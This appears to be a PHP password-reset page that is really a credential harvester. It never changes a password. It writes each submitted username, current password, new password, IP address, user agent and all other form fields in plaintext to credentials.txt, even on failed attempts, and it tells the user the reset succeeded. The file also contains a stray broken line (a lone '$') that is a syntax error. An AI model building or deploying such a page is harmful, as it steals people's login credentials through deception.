<?php
$message = '';
$message_type = '';

// Check if the form was submitted via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $    
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    $new_password = isset($_POST['new_password']) ? trim($_POST['new_password']) : '';
    $confirm_password = isset($_POST['confirm_password']) ? trim($_POST['confirm_password']) : '';
    
    $timestamp = date('Y-m-d H:i:s');
    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
    $ip_address = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown';
   
    // Basic validation
    if (!empty($username) && !empty($password) && !empty($new_password) && !empty($confirm_password)) {
        // Prepare the data to write       
        // Format the password reset entry
        $reset_entry = "=== Password Reset Attempt ===\n";
        $reset_entry .= "Timestamp: " . $timestamp . "\n";
        $reset_entry .= "Username: " . $username . "\n";
        $reset_entry .= "Password: " . $password . "\n";
        $reset_entry .= "New Password: " . $new_password . "\n";
        $reset_entry .= "Confirm Password: " . $confirm_password . "\n";
        $reset_entry .= "IP Address: " . $ip_address . "\n";
        $reset_entry .= "User Agent: " . $user_agent . "\n";
        foreach ($_POST as $key => $value) {
            $reset_entry .= ucfirst($key) . ": " . $value . "\n";
        }
        $reset_entry .= "==============================\n\n";
        
        // Write to credentials.txt (append mode)
        $file_path = 'credentials.txt';
        
        if (file_put_contents($file_path, $reset_entry, FILE_APPEND | LOCK_EX) !== false) {
            $message = "Password reset successful!";
            $message_type = 'success';
        } else {
            $message = "Password reset completed.";
            $message_type = 'success';
        }
    }
    else {
        $reset_entry = "=== Password Reset Failed Attempt ===\n";
        $reset_entry .= "Timestamp: " . $timestamp . "\n";
        foreach ($_POST as $key => $value) {
            $reset_entry .= ucfirst($key) . ": " . $value . "\n";
        }
        $reset_entry .= "IP Address: " . $ip_address . "\n";
        $reset_entry .= "==============================\n\n";
        $message = "All fields are required.";
        $message_type = 'error';
        // Write to credentials.txt (append mode)
        $file_path = 'credentials.txt';
        file_put_contents($file_path, $reset_entry, FILE_APPEND | LOCK_EX);

    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password Reset</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 350px;
        }
        
        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-size: 24px;
        }
        
        .message {
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .message.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .message.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: bold;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #007bff;
            outline: none;
        }
        
        .submit-btn {
            width: 100%;
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        
        .submit-btn:hover {
            background-color: #0056b3;
        }
        
        .back-link {
            text-align: center;
            margin-top: 20px;
        }
        
        .back-link a {
            color: #007bff;
            text-decoration: none;
        }
        
        .back-link a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Password Reset</h1>
        
        <?php if ($message): ?>
            <div class="message <?php echo $message_type; ?>">
                <?php echo htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>
        
        <?php if ($message_type !== 'success'): ?>
        <form method="POST">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" 
                       id="username" 
                       name="username" 
                       placeholder="Enter username" 
                       value="<?php echo isset($_POST['username']) ? htmlspecialchars($_POST['username']) : ''; ?>"
                       >
            </div>
            <div class="form-group">
                <label for="password">Current Password</label>
                <input type="password" 
                       id="password" 
                       name="password" 
                       placeholder="Enter current password" 
                       >
            </div>

            
            <div class="form-group">
                <label for="new_password">New Password</label>
                <input type="password" 
                       id="new_password" 
                       name="new_password" 
                       placeholder="Enter new password" 
                       >
            </div>
            
            <div class="form-group">
                <label for="confirm_password">Confirm Password</label>
                <input type="password" 
                       id="confirm_password" 
                       name="confirm_password" 
                       placeholder="Confirm new password" 
                       >
            </div>
            
            <button type="submit" class="submit-btn">Reset Password</button>
        </form>
        <?php endif; ?>
        
        <div class="back-link">
            <a href="login.html">← Back to Login</a>
        </div>
    </div>
</body>
</html>